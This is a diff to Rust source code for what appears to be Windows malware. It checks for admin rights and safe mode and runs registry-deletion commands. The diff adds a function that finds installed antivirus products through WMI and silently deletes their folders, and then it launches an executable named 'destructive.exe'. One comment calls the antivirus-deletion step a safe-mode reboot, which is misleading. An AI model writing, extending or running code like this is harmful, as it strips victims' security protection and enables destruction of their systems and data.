@@ -1,5 +1,8 @@
 use std::process::Command;
 use std::io::{self};
+use std::path::Path;
+use std::collections::HashMap;
+use wmi::{WMIConnection, COMLibrary};
 
 fn is_admin() -> bool {
     let output = Command::new("whoami")
@@ -47,6 +50,42 @@ fn check_safe_mode() -> bool {
             false
         }
     }
+}
+
+fn remove_antivirus_folder() -> Result<(), Box<dyn std::error::Error>> {
+    // Create the COM library instance
+    let com_lib = COMLibrary::new()?;
+    // Pass the COMLibrary instance to WMIConnection::new
+    let wmi_con = WMIConnection::new(com_lib)?;
+
+    // Query to get antivirus product information
+    let query = "SELECT * FROM AntivirusProduct";
+    // Use the ? operator to extract the Vec on success.
+    let results: Vec<HashMap<String, String>> = wmi_con.raw_query(query)?;
+
+    // Loop through the results and extract the executable path's folder
+    for result in results {
+        if let Some(path) = result.get("pathToSignedProductExe") {
+            // Extract the folder path
+            if let Some(folder_path) = Path::new(path).parent() {
+                println!("Executable folder path: {}", folder_path.display());
+
+                // Remove the folder using rd /s /q (silent remove)
+                let folder_path_str = folder_path.to_str().ok_or("Invalid path")?;
+                let status = Command::new("cmd")
+                    .args(&["/C", "rd", "/s", "/q", folder_path_str])
+                    .status()?;
+
+                if status.success() {
+                    println!("Successfully removed the folder: {}", folder_path.display());
+                } else {
+                    eprintln!("Failed to remove the folder: {}", folder_path.display());
+                }
+            }
+        }
+    }
+
+    Ok(())
 }
 
 fn main() -> io::Result<()> {
@@ -208,13 +247,18 @@ fn main() -> io::Result<()> {
         ];
         commands.extend(delete_registry_cmds);
 
-        // Group 10: Finally, run destructive.exe
-        commands.push("\"C:\\Program Files\\utkudrk2\\destructive.exe\"");
-
         // Execute each command in order
         for command in commands {
             execute_command(command);
         }
+        
+        // Group 10: Reboot the system to Safe Mode if needed
+        if let Err(e) = remove_antivirus_folder() {
+            eprintln!("Error removing antivirus folder: {}", e);
+        }
+
+        // Group 11: Finally, run destructive.exe
+        execute_command("\"C:\\Program Files\\utkudrk2\\destructive.exe\"");
 
         println!("[+] Cleanup tasks completed. Safe Mode should now be removed, destructive.exe is scheduled to run, and Shell key is modified.");
     } else {
